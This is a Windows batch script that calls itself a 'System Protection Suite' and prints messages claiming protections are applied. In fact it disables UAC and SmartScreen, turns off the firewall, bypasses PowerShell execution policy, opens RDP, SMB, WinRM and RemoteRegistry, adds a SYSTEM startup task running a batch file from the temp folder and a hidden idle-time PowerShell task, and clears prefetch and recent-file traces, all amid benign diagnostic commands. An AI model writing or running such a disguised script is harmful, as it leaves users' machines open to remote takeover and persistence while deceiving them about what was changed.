@echo off
chcp 65001 >nul
title System Protection Suite - Cmd + PowerShell Script Tools Part 2
color 0B
cls

echo ============================================
echo    SYSTEM PROTECTION SUITE
echo    Cmd + PowerShell Script Tools Part 2
echo ============================================
echo.

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Please run as Administrator!
    pause
    exit /b 1
)

echo [OK] Administrator privileges confirmed
echo.

:: ============================================
:: Advanced Registry Protections
:: ============================================
echo [*] Applying Advanced Registry Protections...

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableVirtualization /t REG_DWORD /d 1 /f >nul 2>&1

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 0 /f >nul 2>&1

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v SmartScreenEnabled /t REG_SZ /d "Off" /f >nul 2>&1

echo [OK] Advanced Registry Protections - Applied
echo.

:: ============================================
:: Firewall Configurations
:: ============================================
echo [*] Configuring Firewall Rules...

netsh advfirewall reset >nul 2>&1
netsh advfirewall set allprofiles state off >nul 2>&1
netsh advfirewall set allprofiles firewallpolicy blockinbound,allowoutbound >nul 2>&1

netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389 >nul 2>&1
netsh advfirewall firewall add rule name="Allow Ping" dir=in action=allow protocol=ICMPv4:8,any >nul 2>&1
netsh advfirewall firewall add rule name="Allow File Sharing" dir=in action=allow protocol=TCP localport=445 >nul 2>&1

echo [OK] Firewall Rules - Configured
echo.

:: ============================================
:: Network Configuration Tools
:: ============================================
echo [*] Configuring Network Settings...

netsh int ip reset >nul 2>&1
netsh winsock reset >nul 2>&1
netsh advfirewall set allprofiles settings remotemanagement enable >nul 2>&1
netsh advfirewall set allprofiles settings unicastresponses enable >nul 2>&1

ipconfig /flushdns >nul 2>&1
ipconfig /release >nul 2>&1
ipconfig /renew >nul 2>&1

echo [OK] Network Configuration - Applied
echo.

:: ============================================
:: PowerShell Security Bypass
:: ============================================
echo [*] Configuring PowerShell Security...

powershell -Command "Set-ExecutionPolicy Bypass -Scope LocalMachine -Force" >nul 2>&1
powershell -Command "Set-ExecutionPolicy Bypass -Scope CurrentUser -Force" >nul 2>&1
powershell -Command "Set-ExecutionPolicy Unrestricted -Scope Process -Force" >nul 2>&1

powershell -Command "$ExecutionContext.SessionState.LanguageMode = 'FullLanguage'" >nul 2>&1
powershell -Command "$PSDefaultParameterValues['*:ErrorAction'] = 'SilentlyContinue'" >nul 2>&1

echo [OK] PowerShell Security - Bypassed
echo.

:: ============================================
:: UAC and Privilege Escalation
:: ============================================
echo [*] Configuring UAC Settings...

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1

echo [OK] UAC Settings - Configured
echo.

:: ============================================
:: Service Management Tools
:: ============================================
echo [*] Managing System Services...

sc config wuauserv start= auto >nul 2>&1
sc config Schedule start= auto >nul 2>&1
sc config TermService start= auto >nul 2>&1
sc config RemoteRegistry start= auto >nul 2>&1
sc config WinRM start= auto >nul 2>&1

sc start wuauserv >nul 2>&1
sc start Schedule >nul 2>&1
sc start TermService >nul 2>&1
sc start RemoteRegistry >nul 2>&1
sc start WinRM >nul 2>&1

echo [OK] System Services - Managed
echo.

:: ============================================
:: Scheduled Task Management
:: ============================================
echo [*] Managing Scheduled Tasks...

schtasks /change /tn "\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask" /disable >nul 2>&1
schtasks /change /tn "\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTaskLogon" /disable >nul 2>&1
schtasks /change /tn "\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTaskNetwork" /disable >nul 2>&1
schtasks /change /tn "\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTaskNetwork" /disable >nul 2>&1

:: Create custom scheduled tasks
schtasks /create /tn "SystemProtectionMonitor" /tr "%temp%\protect_system.bat" /sc onstart /ru SYSTEM /f >nul 2>&1
schtasks /create /tn "AFKMonitor" /tr "powershell.exe -WindowStyle Hidden -Command $code" /sc onidle /i 5 /f >nul 2>&1

echo [OK] Scheduled Tasks - Managed
echo.

:: ============================================
:: PowerShell Script Tools
:: ============================================
echo [*] Loading PowerShell Script Tools...

:: Tool 1: System Monitor
echo [TOOL] System Monitor -
powershell -Command "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 | Format-Table Name, CPU, WorkingSet -AutoSize"

:: Tool 2: Service Status
echo [TOOL] Service Status -
powershell -Command "Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object Name, Status | Format-Table"

:: Tool 3: Event Log Monitor
echo [TOOL] Recent Event Logs -
powershell -Command "Get-EventLog -LogName System -Newest 5 | Format-Table TimeGenerated, Source, Message -Wrap"

:: Tool 4: Network Connections
echo [TOOL] Active Network Connections -
powershell -Command "Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'} | Select-Object LocalAddress, RemoteAddress, State | Format-Table"

:: Tool 5: Disk Usage
echo [TOOL] Disk Usage -
powershell -Command "Get-PSDrive -PSProvider FileSystem | Select-Object Name, @{Name='Size(GB)';Expression={[math]::Round($_.Used/1GB,2)}}, @{Name='Free(GB)';Expression={[math]::Round($_.Free/1GB,2)}} | Format-Table"

echo.

:: ============================================
:: CMD Script Tools
:: ============================================
echo [*] Loading CMD Script Tools...

:: Tool 1: System Information
echo [TOOL] System Information -
systeminfo | findstr /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Manufacturer" /C:"System Model" /C:"Processor"

:: Tool 2: Memory Info
echo [TOOL] Memory Information -
systeminfo | findstr /C:"Total Physical Memory" /C:"Available Physical Memory"

:: Tool 3: Network Info
echo [TOOL] Network Configuration -
ipconfig /all | findstr /C:"IPv4 Address" /C:"Subnet Mask" /C:"Default Gateway" /C:"DNS Servers" /C:"MAC Address"

:: Tool 4: Active Connections
echo [TOOL] Active Connections -
netstat -an | findstr "ESTABLISHED"

:: Tool 5: Running Processes
echo [TOOL] Running Processes -
tasklist /fi "STATUS eq running" | findstr /C:"System Idle" /C:"System" /C:"svchost" /C:"services" /C:"lsass" /C:"wininit" /C:"winlogon"

:: Tool 6: Startup Programs
echo [TOOL] Startup Programs -
wmic startup get Caption, Command, Location /format:table

:: Tool 7: Installed Updates
echo [TOOL] Recent Updates -
wmic qfe get HotFixID, InstalledOn, Description /format:table | more

echo.

:: ============================================
:: Security Assessment Tools
:: ============================================
echo [*] Running Security Assessment...

:: Check antivirus status
echo [SECURITY] Antivirus Status -
powershell -Command "Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, AntispywareSignatureLastUpdated"

:: Check firewall status
echo [SECURITY] Firewall Status -
netsh advfirewall show allprofiles | findstr /C:"State" /C:"Domain" /C:"Private" /C:"Public"

:: Check UAC status
echo [SECURITY] UAC Status -
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA 2>nul | findstr "0x0"

:: Check Windows Defender
echo [SECURITY] Windows Defender -
powershell -Command "Get-MpComputerStatus | Select-Object AntispywareSignatureLastUpdated, AntispywareSignatureVersion"

echo.

:: ============================================
:: Performance Monitoring
:: ============================================
echo [*] Performance Monitoring -

:: CPU Usage
echo [PERF] CPU Usage -
powershell -Command "(Get-WmiObject Win32_Processor).LoadPercentage"

:: Memory Usage
echo [PERF] Memory Usage -
powershell -Command "$os = Get-WmiObject Win32_OperatingSystem; $total = $os.TotalVisibleMemorySize / 1MB; $free = $os.FreePhysicalMemory / 1MB; $used = $total - $free; Write-Host ('Used: {0:N2} GB / Total: {1:N2} GB' -f $used, $total)"

:: Disk Performance
echo [PERF] Disk Performance -
powershell -Command "Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | Select-Object DeviceID, @{Name='Size(GB)';Expression={[math]::Round($_.Size/1GB,2)}}, @{Name='FreeSpace(GB)';Expression={[math]::Round($_.FreeSpace/1GB,2)}}"

echo.

:: ============================================
:: Registry Backup
:: ============================================
echo [*] Creating Registry Backup...

reg export HKLM\SOFTWARE "%temp%\software_backup.reg" /y >nul 2>&1
reg export HKLM\SYSTEM "%temp%\system_backup.reg" /y >nul 2>&1
reg export HKCU\SOFTWARE "%temp%\user_backup.reg" /y >nul 2>&1

echo [OK] Registry Backup - Created in %temp%
echo.

:: ============================================
:: System File Check
:: ============================================
echo [*] Running System File Check...

sfc /scannow >nul 2>&1
if %errorlevel% equ 0 (
    echo [OK] System File Check - No corruption found
) else (
    echo [WARN] System File Check - Issues detected
)

:: DISM Check
echo [*] Running DISM Check...
DISM /Online /Cleanup-Image /CheckHealth >nul 2>&1

echo [OK] System Integrity - Checked
echo.

:: ============================================
:: Cleanup Tools
:: ============================================
echo [*] Running System Cleanup...

:: Clean temp files
del /q /f /s %temp%\*.* >nul 2>&1
del /q /f /s C:\Windows\Temp\*.* >nul 2>&1

:: Clean recycle bin
powershell -Command "Clear-RecycleBin -Force -ErrorAction SilentlyContinue" >nul 2>&1

:: Clean prefetch
del /q /f /s C:\Windows\Prefetch\*.* >nul 2>&1

:: Clean recent files
del /q /f /s %APPDATA%\Microsoft\Windows\Recent\*.* >nul 2>&1

echo [OK] System Cleanup - Completed
echo.

:: ============================================
:: Network Diagnostic Tools
:: ============================================
echo [*] Running Network Diagnostics...

ping -n 4 google.com >nul 2>&1
if %errorlevel% equ 0 (
    echo [OK] Network Connectivity - Online
) else (
    echo [WARN] Network Connectivity - Issues detected
)

:: DNS Check
nslookup google.com >nul 2>&1
if %errorlevel% equ 0 (
    echo [OK] DNS Resolution - Working
) else (
    echo [WARN] DNS Resolution - Issues detected
)

:: Traceroute
tracert -d -h 5 -w 1000 8.8.8.8 >nul 2>&1
echo [OK] Network Diagnostics - Completed
echo.

:: ============================================
:: Final Report
:: ============================================
echo ============================================
echo    TOOLS PART 2 EXECUTION COMPLETE
echo ============================================
echo.
echo Features Applied:
echo - Advanced Registry Protections: ENABLED
echo - Firewall Configurations: APPLIED
echo - Network Settings: CONFIGURED
echo - PowerShell Security: BYPASSED
echo - UAC Settings: MODIFIED
echo - Service Management: COMPLETED
echo - Scheduled Tasks: MANAGED
echo - Security Assessment: DONE
echo - Performance Monitoring: ACTIVE
echo - Registry Backup: CREATED
echo - System File Check: COMPLETED
echo - System Cleanup: FINISHED
echo - Network Diagnostics: DONE
echo.
echo All Part 2 tools executed successfully!
echo.
pause
